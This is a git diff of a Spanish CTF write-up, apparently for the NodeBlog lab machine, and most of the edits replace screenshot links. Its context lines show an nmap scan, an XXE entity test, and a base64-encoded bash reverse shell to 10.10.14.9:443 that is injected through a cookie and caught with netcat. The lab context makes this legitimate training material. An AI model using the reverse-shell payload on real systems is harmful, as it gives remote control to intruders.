@@ -4,8 +4,10 @@ date: '2022-02-01'
 tags: ["#Import 2022-12-20 21:06"]
 draft: true
 authors: ['default']
-summary: nmap me cuesta descubrir cosas He tenido que ralentizar el comando de descubrir todos los pueortos 
+summary: '![](/static/images/uploads/ctf-nodeblog-writeup/Screenshot_1.webp)'
 ---
+
+![](/static/images/uploads/ctf-nodeblog-writeup/Screenshot_1.webp)
 
 nmap me cuesta descubrir cosas. He tenido que ralentizar el comando de descubrir todos los pueortos porque no me encontraba ninguno más que el 22, A si que lo he lanzado normal
 
@@ -36,7 +38,9 @@ nmap -p22,5000 -sCV -n -Pn -vvv 10.10.11.139 -oN targeted
 ```
 Foto
 
-![](https://blog.ikerocio.com/content/images/2022/02/Screenshot\_2.png)Tiene un login.
+![](/static/images/uploads/ctf-nodeblog-writeup/Screenshot\_2.webp)
+
+Tiene un login.
 
 Probamos sqlmap y no tiene inyecciones sql.
 
@@ -122,7 +126,9 @@ aaa
 &xxe;
 
 ```
-![](https://blog.ikerocio.com/content/images/2022/02/Screenshot\_4.png)Es vulnerable. Modifico el script para probar otras cosas.
+![](/static/images/uploads/ctf-nodeblog-writeup/Screenshot\_4.webp)
+
+Es vulnerable. Modifico el script para probar otras cosas.
 
 Me acuerdo de que cuando me daba el error de json, me daba una ruta donde estaba la app /opt/blog
 
@@ -148,7 +154,9 @@ YmFzaCAtaSAgPiYgIC9kZXYvdGNwLzEwLjEwLjE0LjkvNDQzICAwPiYx
 # Copio el siguiente código en la cookie de burpsuite
 # echo -n YmFzaCAtaSAgPiYgIC9kZXYvdGNwLzEwLjEwLjE0LjkvNDQzICAwPiYx | base64 -d | bash
 ```
-![](https://blog.ikerocio.com/content/images/2022/02/Screenshot\_5.png)Antes de enviarlo, codifico el contenido de auth= a URLEncoding
+![](/static/images/uploads/ctf-nodeblog-writeup/Screenshot\_5.webp)
+
+Antes de enviarlo, codifico el contenido de auth= a URLEncoding
 
 Me pongo en esuccha en mi equipo con netcat y estoy dentro.
 
